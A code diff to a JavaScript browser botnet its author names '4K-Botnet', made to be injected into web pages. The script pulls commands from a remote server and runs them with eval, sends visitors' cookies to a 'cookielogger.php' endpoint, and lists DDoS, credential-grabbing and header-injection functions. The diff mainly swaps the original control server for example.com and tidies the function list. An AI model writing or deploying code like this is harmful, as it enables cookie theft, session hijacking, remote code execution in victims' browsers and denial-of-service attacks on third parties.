@@ -1,6 +1,6 @@
 //4K-Botnet v0.1 by Chowix40
 //I know it's crap but it works (Kinda)
-var SERVER_URL = 'http://4k-server.ddns.net/4K-Botnet/'
+var SERVER_URL = 'http://example.com/Botnet/'
 console.log('4K-Botnet v0.1 by Chowix40')
 
 //Stage 0 - Shows it's been injected
@@ -15,7 +15,7 @@ console.log('Got Commands - Stage 2')
 function getCMD() {
 var oReqcmd = new XMLHttpRequest();    
 oReqcmd.addEventListener("load", reqListener);
-oReqcmd.open("GET", SERVER_URL+"/cmds.php");
+oReqcmd.open("GET", SERVER_URL+"cmds.php");
 oReqcmd.send(null);
 
 function reqListener() {
@@ -28,7 +28,7 @@ eval(oReqcmd.responseText)
 console.log('Execute commands - Stage 3')
 getCMD()
 
-//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. userAlert 5. promptUser
+//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. Injectheader 5. promptUser
 
 //1) DDos
 function DDoS() { 
@@ -98,12 +98,6 @@ function getCookies() {
 console.log('Calling the Cookie Monster...')
 var pic = new Image()
 pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
-} //Done 
-
-//4) Alert_User
-function userAlert() {
-console.log('Alerting user: ' + arguments[0]);
-alert(arguments[0])
 } //Done 
 
 //5) injectHeader
